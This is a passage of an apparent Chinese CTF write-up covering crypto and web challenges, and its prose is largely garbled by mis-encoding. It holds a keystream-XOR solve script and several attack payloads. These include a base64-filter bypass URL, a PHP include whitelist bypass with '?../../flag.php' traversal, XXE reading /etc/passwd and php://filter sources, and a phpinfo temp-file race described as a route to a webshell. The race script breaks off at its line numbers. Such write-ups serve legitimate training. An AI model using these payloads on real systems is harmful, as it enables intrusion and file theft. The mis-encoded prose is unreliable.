å¯†è„šæœ¬ï¼Œè·å¾—keyã€‚ç„¶åkeyä¸å¯†æ–‡å¼‚æˆ–å¾—åˆ°flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def stream(init,size):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(init) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="literal">return</span> init</span><br><span class="line">    <span class="built_in">result</span> = init[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(size<span class="number">-5</span>):</span><br><span class="line">        <span class="keyword">mid</span> = (<span class="built_in">result</span>[index] * <span class="keyword">a</span>[<span class="number">0</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">1</span>] * <span class="keyword">a</span>[<span class="number">1</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">2</span>] * <span class="keyword">a</span>[<span class="number">2</span>]) ^ (<span class="built_in">result</span>[index + <span class="number">3</span>] * <span class="keyword">a</span>[<span class="number">3</span>]) ^ (<span class="built_in">result</span>[index+<span class="number">4</span>] * <span class="keyword">a</span>[<span class="number">4</span>])</span><br><span class="line">        <span class="built_in">result</span>.append(<span class="keyword">mid</span>)</span><br><span class="line">    <span class="literal">return</span> <span class="built_in">result</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">a</span>=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">    cipher = <span class="string">'111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    key = stream([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],<span class="built_in">len</span>(cipher))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>)),<span class="keyword">end</span>=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712114951-1a406990-a458-1.png" alt="img"></a></p><p>è¾“å…¥<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn</a><br>å¾—åˆ°å›æ˜¾<br>ä¸èƒ½è¾“å…¥bXlmbGFnï¼<br>ä½†ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¢«åŠ å¯†åçš„base64å­—ç¬¦ä¸²è§£å¯†æ—¶ä¼¼ä¹ä¼šèˆå¼ƒå¯†æ–‡æœ«å°¾å¤šä½™çš„å­—ç¬¦ï¼ˆå–ä½™4åå¤šå‡ºæ¥çš„å­—ç¬¦ï¼‰ï¼Œäºæ˜¯è¿™é¢˜å°±ä¸éš¾ç»•è¿‡äº†ï¼Œ<br>æœ€ç»ˆpayloadï¼š<br><a href="http://45.76.51.219:8050/?base=bXlmbGFn1" target="_blank" rel="noopener">http://45.76.51.219:8050/?base=bXlmbGFn1</a><br>å¾—åˆ°flag</p><h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>è¿›å…¥ç½‘ç«™ï¼Œf12ï¼Œå‘ç°æ³¨é‡Šï¼š<br>è¿›å…¥sorce.phpå‘ç°æºç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">kind</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"aa"</span>=&gt;<span class="string">"aa.php"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_page = urldecode($page);</span></span><br><span class="line"><span class="php">        $_page = mb_substr(</span></span><br><span class="line"><span class="php">        $_page,</span></span><br><span class="line"><span class="php">        <span class="number">0</span>,</span></span><br><span class="line"><span class="php">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">        );</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; kind::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">echo</span> <span class="string">"&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å…ˆè¿›å…¥click.phpï¼Œå‘ç°ï¼šflag is not here, and flag in flag.php å¾—åˆ°äº†ï¬‚agçš„ä½ç½®ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯è€ƒä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´<br>å®¡è®¡ä»£ç å¾—åˆ°ï¼š<br>è¦è®¾å®špageçš„å€¼ï¼Œä¸”å†…å®¹è¦åœ¨whiteListä¸­<br>mb_substr($page,0,mb_strpos(â€‹$page.â€™?â€™,â€™?â€™))<br>è¡¨ç¤ºæˆªå–pageä¸­ï¼Ÿä¹‹å‰çš„å†…å®¹ æ¥ç€å¯¹$pageè¿›è¡Œä¸€æ¬¡URLdecodeä¹‹åï¼Œå†åˆ¤æ–­ä¸€æ¬¡ã€‚æœ€åï¬leçš„å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² ä¸” checkï¬leè¿”å›çœŸå€¼ å°±èƒ½åŒ…å«æ–‡ä»¶ï¬le<br>æ‰€ä»¥æœ€ç»ˆpayloadï¼š<br><a href="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php" target="_blank" rel="noopener">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</a><br>å¾—åˆ°ä¸€ä¸ªçŒœå¯†ç çš„ç•Œé¢</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>çŒœå¯†ç <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="xml">session_start();</span></span><br><span class="line"><span class="xml">$_SESSION['pwd']=time();</span></span><br><span class="line"><span class="xml">if (isset ($_POST['password'])) </span><span class="xquery">&#123;</span></span><br><span class="line"><span class="xquery">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">'pwd'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>])</span></span><br><span class="line"><span class="xquery">                die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="xquery">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="xquery">                print <span class="string">'&lt;p&gt;çŒœæµ‹é”™è¯¯.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="xquery">                <span class="variable">$_SESSION</span>[<span class="string">'pwd'</span>]=time().time();</span></span><br><span class="line"><span class="xquery">        &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"çŒœå¯†ç "</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>éœ€è¦postä¸€ä¸ªèµ‹å€¼äº†çš„passwordå’Œä¸€ä¸ªå’ŒæœåŠ¡å™¨æ—¶é—´çš„å€¼ç›¸åŒçš„pwdï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       <span class="comment">#htmlè§£æå™¨</span></span><br><span class="line">url=<span class="string">"http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"</span>    <span class="comment">#ç›®æ ‡url</span></span><br><span class="line"></span><br><span class="line">session=requests.session()          <span class="comment">#è·å–ä¸€ä¸ªsessionå¯¹è±¡</span></span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  <span class="comment">#è¿”å›çš„é¡µé¢</span></span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData=&#123;<span class="string">"password"</span>:<span class="string">"123"</span>,<span class="string">"pwd"</span>:<span class="string">"int(time.time())"</span>&#125;<span class="comment">#æ„å»ºä¸€ä¸ªformDataï¼Œç”¨äºä¼ æˆ‘ä»¬çš„</span></span><br><span class="line">re2=session.post(url,data=formData)<span class="comment">#postè¿‡å»</span></span><br><span class="line"></span><br><span class="line">if(<span class="string">"çŒœæµ‹é”™è¯¯"</span> not  in re2.text):</span><br><span class="line">    print(re2.text)</span><br></pre></td></tr></table></figure><p>å‘ç°æ— æ³•è·å¾—flagï¼Œåæ¥å‘ç°pwdèµ‹å€¼ä¸ºç©ºå¯ä»¥è·å¾—flagï¼Œå¯èƒ½æ˜¯$_SESSION[â€˜pwdâ€™]=time();æ²¡æœ‰æ‰§è¡ŒæˆåŠŸã€‚</p><h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>é¦–å…ˆï¼Œäº†è§£ä¸€ä¸‹XXEï¼Œï¼ˆxmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰<br>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a><br>ï¼ˆç„¶åè·Ÿè¿™ä¸ªæ–‡ç« èµ°2333ï¼‰<br>é¦–å…ˆf12çœ‹åˆ°dom.phpå­˜åœ¨XXEï¼Œäºæ˜¯æ„é€ XMLæ–‡æœ¬å…ˆéªŒè¯æ¼æ´ï¼Œ<br>è¿™ä¸€æ­¥éª¤å°†XMLå†…å®¹å‘é€ç»™æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨å°†XMLè§£æå®Œæˆåï¼Œå°±ä¼šä¾ç…§è§£æçš„å†…å®¹å·¥ä½œï¼Œè¿™æ®µXMLä¸­SYSTEM â€œfile:///etc/passwdâ€éƒ¨åˆ†å¼•ç”¨äº†ç›®æ ‡æœåŠ¡å™¨(å³172.16.12.2)ä¸‹çš„/etc/passwdæ–‡ä»¶ï¼ŒæœåŠ¡å™¨è§£æXMLå†…å®¹åï¼Œä¼šå°†è¿™ä¸€æ–‡ä»¶å†…å®¹å­˜å…¥&amp;xxeä¸­ï¼Œç„¶åå°†æ•°æ®è¿”å›ç»™æ¶æ„è®¿é—®è€…ã€‚<br>æ‰§è¡Œå®Œæˆä¸Šé¢çš„æ“ä½œåï¼Œç‚¹å‡»GOï¼Œå³ä¾§å°†å‡ºç°æ­¤æ•°æ®åŒ…çš„è¿”å›ç»“æœï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¿”å›çš„æ•°æ®ä¸ºæœåŠ¡å™¨ä¸Š/etc/passwdæ–‡ä»¶çš„å†…å®¹<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113909-9b4cfdf2-a456-1.png" alt="img"></a></p><p>æ¼æ´éªŒè¯æˆåŠŸï¼Œ<br>äºæ˜¯ä¿®æ”¹XMLä¸­çš„å¤–éƒ¨å®ä½“ä¸ºå…¶ä»–åè®®ï¼Œæ ¹æ®æç¤ºçœ‹hintï¼Œphp://filter/read=convert.base64-encode/resource=hint.phpï¼Œ åœ¨Proxyé€‰é¡¹å¡çš„åŸæ•°æ®åŒ…ä¸­ç²˜è´´XMLå†…å®¹ï¼Œç‚¹å‡»FORWARDæ”¾è¡Œè¯·æ±‚ï¼Œè¿”å›çš„ç»“æœ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113923-a423271c-a456-1.png" alt="img"></a></p><p>è§£ç åå¾—åˆ°ç›®å½•ï¼Œ<br>äºæ˜¯<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712113936-ab5c0b66-a456-1.png" alt="img"></a></p><p>è§£ç å¾—åˆ°flag</p><h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>è¿›å…¥é¡µé¢ï¼Œf12ï¼Œå‘ç°æ³¨é‡Š phpinfo.php<br>ç„¶åæ ¹æ®åå­—ï¼ŒçŒœæµ‹æ˜¯phpæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰<br>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼ˆåˆæ˜¯è·Ÿç€æ–‡ç« èµ°ï¼‰<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a><br>è®¿é—®<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a> éªŒè¯æ¼æ´ï¼Œ<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712115212-6e4f092e-a458-1.png" alt="img"></a><br>æˆåŠŸã€‚<br>æ–‡ç« å¦‚æ˜¯è¯´ï¼š<br>å…ˆè®²ä¸€ä¸‹åˆ©ç”¨phpinfoä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æ–‡ä»¶åŒ…å«çš„åŸç†ï¼š</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p><p>åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºè®¿é—®çš„ä»£ç ä¸­æ˜¯å¦æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œphpéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ï¼ŒåŒæ—¶ï¼Œphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ã€‚ä½†æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚</p><p>å› ä¸ºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</p><p>ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•å»åˆ©ç”¨è¿™ç‚¹ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œåªè¦å‘é€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œè®©é¡µé¢è¿˜æœªååº”è¿‡æ¥ï¼Œå°±ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼š</p><p>1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerï¼Œgetç­‰ä½ç½®ä¸€å®šè¦å¡æ»¡åƒåœ¾æ•°æ®ï¼›</p><p>2ï¼‰phpinfoè¿™æ—¶ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œå…¶ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†phpinfoæ’‘å¾—éå¸¸å¤§</p><p>3ï¼‰PHPé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯4096ï¼Œå³PHPæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</p><p>4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ï¼Œåªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</p><p>5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å…¶å®è¿˜æ²¡æœ‰ç»“æŸï¼Œä½†æ˜¯PHPè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶è¿˜æœªè¢«åˆ é™¤</p><p>6ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ågetshell<br>åˆ©ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span 